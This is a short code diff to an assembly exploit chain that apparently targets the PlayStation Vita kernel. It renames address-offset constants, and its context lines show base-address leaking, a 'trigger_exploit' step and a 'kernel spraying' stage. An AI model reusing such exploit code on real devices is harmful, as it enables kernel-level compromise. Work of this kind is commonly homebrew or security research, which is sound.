@@ -29,7 +29,7 @@
 .equ COPYOUT_PARAMS_OFFSET,  0xa0
 
 // SceLibKernel offsets
-.equ SCE_LIB_KERNEL_BASE,    -0xa4b7
+.equ SCE_LIB_KERNEL_OFFSET,  -0xa4b7
 .equ GET_MODULE_LIST_OFFSET, 0x675c
 .equ GET_MODULE_INFO_OFFSET, 0x676c
 .equ GET_THREAD_INFO_OFFSET, 0xa791
@@ -100,7 +100,7 @@ _start:
   // Get SceLibKernel base address
   call_v   sceIoOpen, 0xDEADBEEF
   get_lr
-  add_rv   ret, SCE_LIB_KERNEL_BASE
+  add_rv   ret, SCE_LIB_KERNEL_OFFSET
   store_rv ret, libkernel_base
 
   // Get SceLibKernel functions
@@ -197,7 +197,7 @@ _start:
   trigger_exploit
 
   // Get SceSysmem base address
-  load_add_store sysmem_base, sysmem_base, SCE_SYSMEM_BASE
+  load_add_store sysmem_base, sysmem_base, SCE_SYSMEM_OFFSET
 
   /** STAGE 4: Kernel spraying **/
 
